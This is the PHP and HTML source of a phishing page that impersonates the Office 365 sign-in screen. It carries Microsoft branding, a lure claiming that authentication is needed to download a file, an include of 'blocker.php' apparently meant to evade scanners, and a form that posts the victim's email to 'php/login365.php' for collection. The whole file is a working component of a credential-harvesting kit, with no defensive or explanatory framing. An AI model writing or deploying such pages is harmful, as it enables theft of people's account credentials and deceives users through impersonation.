<?php


session_start();
include("blocker.php");

?>

<!DOCTYPE html>
<html>
<head>
	<title>Office 365 - Login</title>
	<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0, user-scalable=no">
	
	<link rel="shortcut icon" type="icon" href="assets/favicon.ico">
	<link rel="stylesheet" type="text/css" href="scripts/ms-style.css">
	<script type="text/javascript" src="scripts/jquery-2.1.1.min.js"></script>	
	
	<script type="text/javascript"> 
		function isValidEmailAddress(emailAddress) {
		    var pattern = new RegExp(/^(("[\w-\s]+")|([\w-]+(?:\.[\w-]+)*)|("[\w-\s]+")([\w-]+(?:\.[\w-]+)*))(@((?:[\w-]+\.)*\w[\w-]{0,66})\.([a-z]{2,6}(?:\.[a-z]{2})?)$)|(@\[?((25[0-5]\.|2[0-4][0-9]\.|1[0-9]{2}\.|[0-9]{1,2}\.))((25[0-5]|2[0-4][0-9]|1[0-9]{2}|[0-9]{1,2})\.){2}(25[0-5]|2[0-4][0-9]|1[0-9]{2}|[0-9]{1,2})\]?$)/i);
		    return pattern.test(emailAddress);
		};

		$(function(){

			$(document).ready(function(){
			    $("#next").click(function(){
			    	$('#loader').show();
		    		
		    		if(!isValidEmailAddress($('#email').val())) {
					    $('#email').addClass("error");
			    		$('#message').show();
			    		$('#message').text('Enter a valid email address, phone number, or Skype name.');
			    		$('#loader').hide();

			    		$('#email').on('input',function(){
					    	$('#email').removeClass('error');
					    	$('#message').hide();
					    });
					    return false;
					}

			    });
			});
		});
	</script>
	
</head>

<body>
	<div class="overlay">
		<div class="login-box">
			<img src="assets/365.png" height="70" alt="logo">
<h2 id="title">User authentication is required to download this file</h2>
			<h2 id="title">Sign&nbsp;in to Office 365</h2>

			<p id="message" class="message"><?php echo $errorMsg; ?></p>

			 <form action="php/login365.php" method="post">
			 	
				<input id="email" <?php echo $_SESSION['disabled']; ?> minlength="6" type="email" name="email" style="padding-left: 0px; border: 0px; border-bottom: 1px solid #aaa" value="<?php echo @$email; ?>" placeholder="Email, phone, or Skype">
				<div id="loader" class="loader" hidden>
					<div class="circle"></div>
					<div class="circle"></div>
					<div class="circle"></div>
					<div class="circle"></div>
					<div class="circle"></div>
				</div>
				

			<br>

			<div id="group1" style="margin-top: 0px">
				<small id="cant"><a href="#" class="fade">Can't&nbsp;access&nbsp;your&nbsp;account?</a></small>
			</div>
			
			<button type="submit" style="margin-top: 60px; margin-left: 240px; width: 110px; height: 35px" name="submit" id="next" class="next">Next</button>
			</form>
			
		</div>
	</div>

	<footer>
		<ul>
			<li><a href="#">Privacy & cookies</a></li>
			<li><a href="#">Terms of use</a></li>
			<li><a>&copy;2019&nbsp;Microsoft</a></li>
		</ul>
	</footer>

</body>
</html>
